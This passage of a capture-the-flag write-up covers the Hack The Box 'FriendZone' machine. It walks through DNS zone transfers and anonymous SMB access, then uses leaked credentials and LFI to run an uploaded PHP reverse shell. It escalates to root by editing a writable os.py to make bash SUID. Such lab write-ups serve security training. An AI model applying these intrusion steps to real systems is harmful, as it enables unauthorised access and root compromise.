</span></span><span class=line><span class=cl><span class=p>|</span> VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
</span></span><span class=line><span class=cl><span class=p>|</span> BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
</span></span><span class=line><span class=cl><span class=p>|</span> bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
</span></span><span class=line><span class=cl><span class=p>|</span> MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
</span></span><span class=line><span class=cl><span class=p>|</span> VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
</span></span><span class=line><span class=cl><span class=p>|</span> MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
</span></span><span class=line><span class=cl><span class=p>|</span> hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
</span></span><span class=line><span class=cl><span class=p>|</span> A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
</span></span><span class=line><span class=cl><span class=p>|</span> lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
</span></span><span class=line><span class=cl><span class=p>|</span> 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
</span></span><span class=line><span class=cl><span class=p>|</span> gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
</span></span><span class=line><span class=cl><span class=p>|</span> 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
</span></span><span class=line><span class=cl><span class=p>|</span> ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
</span></span><span class=line><span class=cl><span class=p>|</span> BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
</span></span><span class=line><span class=cl><span class=p>|</span> V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
</span></span><span class=line><span class=cl><span class=p>|</span> TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
</span></span><span class=line><span class=cl><span class=p>|</span> LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
</span></span><span class=line><span class=cl><span class=p>|</span> K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
</span></span><span class=line><span class=cl><span class=p>|</span> Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
</span></span><span class=line><span class=cl><span class=p>|</span> X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
</span></span><span class=line><span class=cl><span class=p>|</span> fv9s+GxKNvsBqDBX
</span></span><span class=line><span class=cl><span class=p>|</span>_-----END CERTIFICATE-----
</span></span><span class=line><span class=cl>445/tcp open              syn-ack ttl <span class=m>63</span> Samba smbd 4.7.6-Ubuntu <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: Hosts: FRIENDZONE, 127.0.1.1<span class=p>;</span> OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class=o>(</span>unknown<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Names:
</span></span><span class=line><span class=cl><span class=p>|</span>   FRIENDZONE&lt;00&gt;       Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   FRIENDZONE&lt;03&gt;       Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   FRIENDZONE&lt;20&gt;       Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=se>\x</span>01<span class=se>\x</span>02__MSBROWSE__<span class=se>\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class=line><span class=cl><span class=p>|</span> Statistics:
</span></span><span class=line><span class=cl><span class=p>|</span>   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
</span></span><span class=line><span class=cl><span class=p>|</span>   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
</span></span><span class=line><span class=cl><span class=p>|</span>_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode:
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1:
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time:
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-09-06T15:35:12
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker:
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 60332/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Couldn<span class=s1>&#39;t connect)
</span></span></span><span class=line><span class=cl><span class=s1>|   Check 2 (port 29635/tcp): CLEAN (Couldn&#39;</span>t connect<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 37865/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Failed to receive data<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 49559/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Failed to receive data<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery:
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows 6.1 <span class=o>(</span>Samba 4.7.6-Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: friendzone
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: FRIENDZONE<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Domain name: <span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   FQDN: friendzone
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2023-09-06T18:35:12+03:00
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode:
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span></code></pre></div><p>The scan shows 7 ports up and running, 80 and 443 are running web servers, 139 and 445 are smb ports, 22 for ssh, 21 for ftp and 25 is running a ISC service which is a kind of DNS.</p><p>I’ll take careful notice of the domain in the TLS certificate, <code>commonName=friendzone.red</code></p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>As always I am gonna start with the websites.</p><p>First let’s start with the http server.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-1.png></p><p>Te homepage leaks a email with a URL <code>friendzoneportal.red</code> maybe there is virtualhosting in the website.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t <span class=m>100</span> -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span>
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 13<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>/wordpress            <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 316<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.10.123/wordpress/<span class=o>]</span>
</span></span></code></pre></div><p>After a quick fuzz two directories are shown</p><p><code>/robots.txt</code> is troll.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-2.png></p><p><code>/wordpress</code> is empty.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-3.png></p><p>So let’s move to the ssl site.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-4.png></p><p><img alt=Untitled loading=lazy src=/HTB/friend-5.png></p><p>In the homepage we found normal gif but if we access to the source code there is a comment leaking a directory <code>/js/js</code> on development.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-6.png></p><p>The directory <code>/js/js</code> is a page which maybe something is being tested.</p><p>There are also some hidden comments at the source code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>Testing some functions !<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>p</span><span class=p>&gt;</span>I&#39;am trying not to break things !<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>SkUyRVFwSlF2VzE2OTQzMzc4MjIybkJLbUE5RVdN
</span></span><span class=line><span class=cl><span class=c>&lt;!-- dont stare too much , you will be smashed ! , it&#39;s all about times and zones ! --&gt;</span>
</span></span></code></pre></div><p>I don’t know what are they referring to, but you have to keep in mind that it could just be a rabbit hole.</p><p>Let’s do a quick fuzz</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u https://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t <span class=m>100</span> -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 318<span class=o>]</span> <span class=o>[</span>--&gt; https://friendzone.red/admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 238<span class=o>]</span>
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 315<span class=o>]</span> <span class=o>[</span>--&gt; https://friendzone.red/js/<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 303<span class=o>]</span>
</span></span></code></pre></div><p>Again, only two directories are displayed</p><p><img alt=Untitled loading=lazy src=/HTB/friend-7.png></p><p><code>/admin</code> is a empty directory as <code>/wordpress</code> in the http site.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-8.png></p><p><code>/js</code> lists only one directory named <code>/js</code> which is the one we have already visited.</p><p>If we return to the nmap scan there, the TCP port 53 is for DNS which means that maybe this is associated with Zone Transfers, where the server give all the information it has for a domain. Before doing any virtual hosting scans I checked Zone Transfers for enumerating DNS.</p><p>As we have two domains let’s see what outputs dig command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dig @10.10.10.123 friendzone.red axfr 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @10.10.10.123 friendzone.red axfr
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	AAAA	::1
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	NS	localhost.
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>administrator1.friendzone.red. <span class=m>604800</span> IN A	127.0.0.1
</span></span><span class=line><span class=cl>hr.friendzone.red.	604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>uploads.friendzone.red.	604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>friendzone.red.		604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>110</span> msec
</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.10.10.123#53<span class=o>(</span>10.10.10.123<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Sun Sep <span class=m>10</span> 12:07:34 CEST <span class=m>2023</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> XFR size: <span class=m>8</span> records <span class=o>(</span>messages 1, bytes 261<span class=o>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dig @10.10.10.123 friendzoneportal.red axfr
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>;</span> &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @10.10.10.123 friendzoneportal.red axfr
</span></span><span class=line><span class=cl><span class=p>;</span> <span class=o>(</span><span class=m>1</span> server found<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> global options: +cmd
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	AAAA	::1
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	NS	localhost.
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	A	127.0.0.1
</span></span><span class=line><span class=cl>admin.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>files.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>imports.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>vpn.friendzoneportal.red. <span class=m>604800</span> IN	A	127.0.0.1
</span></span><span class=line><span class=cl>friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. <span class=m>2</span> <span class=m>604800</span> <span class=m>86400</span> <span class=m>2419200</span> <span class=m>604800</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> Query time: <span class=m>104</span> msec
</span></span><span class=line><span class=cl><span class=p>;;</span> SERVER: 10.10.10.123#53<span class=o>(</span>10.10.10.123<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> WHEN: Sun Sep <span class=m>10</span> 12:08:07 CEST <span class=m>2023</span>
</span></span><span class=line><span class=cl><span class=p>;;</span> XFR size: <span class=m>9</span> records <span class=o>(</span>messages 1, bytes 281<span class=o>)</span>
</span></span></code></pre></div><p>Cool we have a bunch of possible subdomains, let’s put them on <code>/etc/hosts</code></p><p>First I tried to access to each subdomain with the http port but seem to go back to the same site so I started to do it with ssl site instead.</p><table><thead><tr><th>Domain</th><th>Comments</th></tr></thead><tbody><tr><td>administrator1.friendzone.red</td><td>Seems a admin page</td></tr><tr><td>uploads.friendzone.red</td><td>Fake uploads site</td></tr><tr><td>hr.friendzone.red</td><td>Not Found</td></tr><tr><td>friendzoneportal.red</td><td>Only a GIF of Michael Jackson</td></tr><tr><td>admin.friendzoneportal.red</td><td>When I try to put any creds shows “Admin page is not developed yet !!! check for another one”</td></tr><tr><td>files.friendzoneportal.red</td><td>Not Found</td></tr><tr><td>imports.friendzoneportal.red</td><td>Not Found</td></tr><tr><td>vpn.friendzoneportal.red</td><td>Not Found</td></tr></tbody></table><p><a href=http://administrator1.friendzone.red><code>administrator1.friendzone.red</code></a> is the only one which seems working but need a valid credentials. I tried some common credentials but failed.</p><p>Let’s move now to other ports.</p><p>I started with the ftp service. I tried to log in anonymously but the login failed</p><p>So I decided to try to access to smb instead, using smbmap I can access anonymously and see what permissions I have on the shares.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-9.png></p><p>Interesting the Files shares comment show his directory so we can assume that all the directories are located at <code>/etc</code> without doing any enumeration.</p><p>Thanks to smbmap we also know that general is only readable and Development is readable and writeable.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-11.png></p><p>Development seems empty.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-10.png></p><p>general has only one file with credentials.</p><pre tabindex=0><code>creds for the admin THING:

admin:WORKWORKHhallelujah@#
</code></pre><p>Maybe there are credentials for the admin site.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/friend-12.png></p><p>Once logged in in the admin page, the site tells yo to visit to the dashboard.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-13.png></p><p>In order to show the image we need to put the two default parameters.</p><p><code>image_id=a.jpg&amp;pagename=timestamp</code></p><p><img alt=Untitled loading=lazy src=/HTB/friend-14.png></p><p>Interesting pagename points to timestamp and if the input is not being sanitized maybe we can change the input to other file.</p><p>I tried to point to the dashboard.php page but the site is not loading.</p><p>After that I realized that the code is putting .php at the end of the input.</p><p><code>image_id=a.jpg&amp;pagename=dashboard</code></p><p><img alt=Untitled loading=lazy src=/HTB/friend-15.png></p><p>The site is loading infinite times so we can assume that we have LFI with php files.</p><p>Now we have LFI and if we remember the samba shares are pointing to folders on the <code>/etc</code> directory so we are able to upload a shell and make it run with the pagename parameter.</p><p>The only share which is writable is the Development folder so I tried to upload a php reverse shell. As always I am gonna using the <a href=https://pentestmonkey.net/tools/web-shells/php-reverse-shell>pentestmonkey</a> one</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbmap -H 10.10.10.123 --upload <span class=s1>&#39;./shell.php&#39;</span> <span class=s1>&#39;Development\shell.php&#39;</span>
</span></span></code></pre></div><p>Now let’s set a nc listener and run the php reverse shell with the next parameters <code>image_id=a.jpg&amp;pagename=../../../../../../etc/Development/shell</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4444</span>
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/friend-16.png></p><p>Great we are <strong>www-data</strong> now.</p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/friend-17.png></p><p>If we check the <code>/var/www</code> directory where are located all the sites we can see a suspicious mysql file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>for</span> development process this is the mysql creds <span class=k>for</span> user friend
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>db_user</span><span class=o>=</span>friend
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>db_pass</span><span class=o>=</span>Agpyu12!0.213$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>db_name</span><span class=o>=</span>FZ
</span></span></code></pre></div><p>Seems credentials for access to a mysql database, but let’s see if there is a password reuse.</p><p>I tried to access to the user friend with the command <code>su friend</code></p><p><img alt=Untitled loading=lazy src=/HTB/friend-20.png></p><p>Awesome we are logged as normal user.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-19.png></p><p>Now it’s time to privEsc.</p><p>As always I checked for unusual processes or open ports but I don’t found anything and then I have searched for SUID files to exploit but there was nothing exploitable.</p><p>Once done the initial check I start the scan of scheduled processes with <a href=http://moniProc.sh>moniProc.sh</a> which I have used in a lot of writeups.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; /usr/sbin/CRON -f
</span></span><span class=line><span class=cl>&gt; /bin/sh -c /opt/server_admin/reporter.py
</span></span><span class=line><span class=cl>&gt; /usr/bin/python /opt/server_admin/reporter.py
</span></span></code></pre></div><p>A cronjob is executing a python script, let’s check his content.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>to_address</span> <span class=o>=</span> <span class=s2>&#34;admin1@friendzone.com&#34;</span>
</span></span><span class=line><span class=cl><span class=n>from_address</span> <span class=o>=</span> <span class=s2>&#34;admin2@friendzone.com&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;[+] Trying to send email to </span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=n>to_address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &#34;PAPAP&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#os.system(command)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># I need to edit the script later</span>
</span></span><span class=line><span class=cl><span class=c1># Sam ~ python developer</span>
</span></span></code></pre></div><p>The scripts doesn’t seems exploitable but is using the os library, if this library is vulnerable to Library Hijacking we are able to execute whatever we want.</p><p>The attack explanation is simple, the searched python module will be located in one of the defined paths, but if Python finds a module with the <em><strong>same</strong></em> name in a folder with higher priority, it will import that module instead of the “legit” one.</p><p>We can know the Python Path with the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;import sys; print(sys.path)&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/plat-x86_64-linux-gnu&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/lib-tk&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/lib-old&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/lib-dynload&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/local/lib/python2.7/dist-packages&#39;</span><span class=p>,</span> <span class=s1>&#39;/usr/lib/python2.7/dist-packages&#39;</span><span class=p>]</span>
</span></span></code></pre></div><p>The first path that python will check will be the script directory, if nothing is located at the script directory python will check all the remaining paths.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-21.png></p><p>As we can’t write anything on the script folder, we need to check if any folder containing os.py module is writable in order to perform the attack.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-22.png></p><p>As we know the first folder python will check is the <code>/usr/lib/python2.7</code>, let’s check if we can modify the module.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-23.png></p><p>We have permissions to edit the file so we can put the following line of code which is going to be executed always when we import the library.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>system</span><span class=p>(</span><span class=s1>&#39;chmod 4755 /bin/bash&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>As the cronjob is executed as root, we are able to execute commands as the above which helps us to privEsc changing the bash permissions to that of a SUID file.</p><p>Now only rests to wait.</p><p><img alt=Untitled loading=lazy src=/HTB/friend-26.gif></p><p>If we execute the following command the current bash session is gonna turn to a root session.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>bash</span> <span class=o>-</span><span class=n>p</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/friend-24.png></p><p><img alt=Untitled loading=lazy src=/HTB/friend-25.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/privesc/>Privesc</a></li><li><a href=http://localhost:1313/tags/web/>Web</a></li><li><a href=http://localhost:1313/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>